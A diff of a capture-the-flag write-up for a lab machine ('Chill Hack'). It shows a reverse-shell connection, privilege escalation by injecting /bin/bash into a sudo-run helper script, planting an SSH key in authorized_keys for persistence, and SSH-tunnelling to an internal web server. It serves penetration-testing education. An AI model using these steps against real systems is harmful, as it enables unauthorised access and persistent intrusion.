@@ -86,7 +86,7 @@ https://packages.ubuntu.com/search?keywords=apache2
 https://packages.ubuntu.com/search?keywords=openssh
 
 
-### FTP
+#### FTP
 
 Since we see that anonymous FTP is allowed, we grab the note.txt file:
 
@@ -122,7 +122,7 @@ Anurodh told me that there is some filtering on strings being put in the command
 We got a note from Anurodh about some strings filtering mechanism in action. We will see it soon. 
 
 
-### HTTP
+#### HTTP
 
 
 We check target with our browser:
@@ -257,18 +257,312 @@ After this, we try again with our curl POST request:
 And we get a shell!
 
 
-```connect to [10.8.147.132] from (UNKNOWN) [10.10.123.185] 44832
-bash: cannot set terminal process group (1050): Inappropriate ioctl for device
+```
+connect to [10.8.147.132] from (UNKNOWN) [10.10.94.161] 57314
+bash: cannot set terminal process group (1049): Inappropriate ioctl for device
 bash: no job control in this shell
+www-data@ubuntu:/var/www/html/secret$
+www-data@ubuntu:/var/www/html/secret$
+www-data@ubuntu:/var/www/html/secret$
 www-data@ubuntu:/var/www/html/secret$ id
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 
+Let's upgrade to a more stable shell:
+
+
+```
+www-data@ubuntu:/var/www/html/secret$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@ubuntu:/var/www/html/secret$
+
+```
+
+
+User flag isn't there:
+
+```
+www-data@ubuntu:/var/www/html/secret$ ls
+ls
+images  index.php
+```
+
+
+So we must look on other home directories:
+
+
+```
+www-data@ubuntu:/var/www/html/secret$ ls -R /home
+ls -R /home
+/home:
+anurodh  apaar  aurick
+ls: cannot open directory '/home/anurodh': Permission denied
+
+/home/apaar:
+local.txt
+ls: cannot open directory '/home/aurick': Permission denied
+```
+
+We are only allowed to explore apaar's home, let's move there:
+
+
+```www-data@ubuntu:/var/www/html/secret$ cd /home/apaar
+cd /home/apaar
+www-data@ubuntu:/home/apaar$ cat local.txt
+cat local.txt
+cat: local.txt: Permission denied
+```
+
+We have no permission to open local.txt file.
+
+
+Let's try if there is some sudo permission:
+
+
+```
+www-data@ubuntu:/home/apaar$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu:
+    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
+```
+
+Ok, we can run /home/apaar/.helpline.sh as apaar user; let's check that file:
+
+
+```
+www-data@ubuntu:/home/apaar$ cat /home/apaar/.helpline.sh
+cat /home/apaar/.helpline.sh
+#!/bin/bash
+
+echo
+echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
+echo
+
+read -p "Enter the person whom you want to talk with: " person
+
+read -p "Hello user! I am $person,  Please enter your message: " msg
+
+$msg 2>/dev/null
+
+echo "Thank you for your precious time!"
+```
+
+Let's try to actually run it:
+
+
+```
+www-data@ubuntu:/home/apaar$ sudo -S -u apaar /home/apaar/.helpline.sh
+sudo -S -u apaar /home/apaar/.helpline.sh
+
+Welcome to helpdesk. Feel free to talk to anyone at any time!
+
+Enter the person whom you want to talk with: God
+God
+Hello user! I am God,  Please enter your message: Happy new year
+Happy new year
+Thank you for your precious time!
+```
+
+As we can see, we could inject some code in $msg variable. Let's try with bash:
+
+
+```
+www-data@ubuntu:/home/apaar$ sudo -S -u apaar /home/apaar/.helpline.sh
+sudo -S -u apaar /home/apaar/.helpline.sh
+
+Welcome to helpdesk. Feel free to talk to anyone at any time!
+
+Enter the person whom you want to talk with: God
+God
+Hello user! I am God,  Please enter your message: /bin/bash
+/bin/bash
+id
+id
+uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
+```
+
+Ok, we are now apaar user.
+
+
+Let's upgrade our shell:
+
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+apaar@ubuntu:~$ id
+id
+uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
+apaar@ubuntu:~$ ls
+ls
+local.txt
+apaar@ubuntu:~$ cat local.txt
+cat local.txt
+{USER-FLAG: e8[....................]}
+```
+
+To be more comfortable with our shell, let's generate an SSH keypairs:
+
+
+```
+# ssh-keygen -f ./chillhack
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in ./chillhack
+Your public key has been saved in ./chillhack.pub
+The key fingerprint is:
+SHA256:TSADaC4wTm2bXEhFA8MtYZ2S7LJujzrcXFm2JylDKeg root@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|  =B@=+ .        |
+|o.+X.=.o .       |
+|++= * .   .      |
+|.+.* o o o       |
+|..o o + S .      |
+| E   = + .       |
+|o o . o o        |
+|.+.o             |
+|+o..             |
++----[SHA256]-----+
+
+
+# cat chillhack.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYI0pKoPdhlElJqaJGviyqUhA6db1aaGFpjJTcziMZvHVt86fvFyZqsl+ppbBil9CQGe8lyD7j79ZQhkiHZQU/tiPxyDVPlfE7ZiKVRkFUWgM5vzf2m8SkPSNJD7TUVac/eZVQ0CWA8i1aSCguwGuodYrVtrtCQBZjBe9BuzYaVeR0hggPWflJtyGoSqbbF4uPMBP1TK2sV3CmjIkG5O1brU7Z1kq4oXcEHk5EOEXIrjFJNRBYU2wMd6owlR7Zz3BE1nggaNe3CodxWhufuh1A+PcVwMbvQPdXAbJa3xwaywzoUdYl5LiBZ1uqj5pQpdSvBSPTu7OA5/s0BhYb3iZol1McqpiYfhJ+g+n6VJ92wnt3NwN9Yv+sbg1lMGAuf87WO48GY6c6EyCrAndsQl6iKJLQmcJ5F03IaQBfoZTdrk++VOcDwjgPszjhvZN5ZXAn9akUQ+z4zqpuaEtRnvCJQk9stoRayTHixflb7FvcjvtS3M4asxAx9YmMccjumLM= root@kali
+
+
+```
+
+
+Let's add our public key to authorized keys file:
+
+
+```
+apaar@ubuntu:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYI0pKoPdhlElJqaJGviyqUhA6db1aaGFpjJTcziMZvHVt86fvFyZqsl+ppbBil9CQGe8lyD7j79ZQhkiHZQU/tiPxyDVPlfE7ZiKVRkFUWgM5vzf2m8SkPSNJD7TUVac/eZVQ0CWA8i1aSCguwGuodYrVtrtCQBZjBe9BuzYaVeR0hggPWflJtyGoSqbbF4uPMBP1TK2sV3CmjIkG5O1brU7Z1kq4oXcEHk5EOEXIrjFJNRBYU2wMd6owlR7Zz3BE1nggaNe3CodxWhufuh1A+PcVwMbvQPdXAbJa3xwaywzoUdYl5LiBZ1uqj5pQpdSvBSPTu7OA5/s0BhYb3iZol1McqpiYfhJ+g+n6VJ92wnt3NwN9Yv+sbg1lMGAuf87WO48GY6c6EyCrAndsQl6iKJLQmcJ5F03IaQBfoZTdrk++VOcDwjgPszjhvZN5ZXAn9akUQ+z4zqpuaEtRnvCJQk9stoRayTHixflb7FvcjvtS3M4asxAx9YmMccjumLM= root@kali" >> .ssh/authorized_keys
+<sxAx9YmMccjumLM= root@kali" >> .ssh/authorized_keys
+```
+
+
+Let's access through SSH:
+
+
+```
+# ssh -i chillhack apaar@10.10.94.161
+The authenticity of host '10.10.94.161 (10.10.94.161)' can't be established.
+ECDSA key fingerprint is SHA256:ybdflPQMn6OfMBIxgwN4h00kin8TEPN7r8NYtmsx3c8.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.94.161' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Jan  2 16:15:11 UTC 2022
+
+  System load:  0.0                Processes:              113
+  Usage of /:   24.8% of 18.57GB   Users logged in:        0
+  Memory usage: 20%                IP address for eth0:    10.10.94.161
+  Swap usage:   0%                 IP address for docker0: 172.17.0.1
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+19 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Sun Oct  4 14:05:57 2020 from 192.168.184.129
+```
+
+
+Now it's time to...
 
 
 
+### Privilege escalation
+
+
+Let's enumerate "from inside":
+
+
+```
+apaar@ubuntu:~$ sudo -l
+Matching Defaults entries for apaar on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User apaar may run the following commands on ubuntu:
+    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
+apaar@ubuntu:~$ crontab -l
+no crontab for apaar
+```
+
+Nothing new here. Let's try with netstat:
+
+
+```
+apaar@ubuntu:~$ netstat -natlp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:9001          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 10.10.94.161:57314      10.8.147.132:4444       CLOSE_WAIT  -
+tcp        0    612 10.10.94.161:22         10.8.147.132:37606      ESTABLISHED -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::21                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       1      0 10.10.94.161:80         10.8.147.132:40028      CLOSE_WAIT  -
+```
+
+
+This sounds interesting! We got 3 more ports (53/TCP, 3306/tcp, 9001/TCP) since our initial scan, only listening on localhost.
+
+
+
+Let's check which service is listening on port 9001:
+
+```
+apaar@ubuntu:~$ nc 127.0.0.1 9001
+
+HTTP/1.1 400 Bad Request
+Date: Sun, 02 Jan 2022 16:26:07 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Content-Length: 303
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>400 Bad Request</title>
+</head><body>
+<h1>Bad Request</h1>
+<p>Your browser sent a request that this server could not understand.<br />
+</p>
+<hr>
+<address>Apache/2.4.29 (Ubuntu) Server at 127.0.1.1 Port 9001</address>
+</body></html>
+
+```
+
+We got another webserver. In order to navigate from our attacking box, let's use SSH tunneling:
+
+
+```
+# ssh -i chillhack -L 9001:localhost:9001 apaar@10.10.94.161
+```
+
+
+Now we can explore webserver on our box:
 
 
 
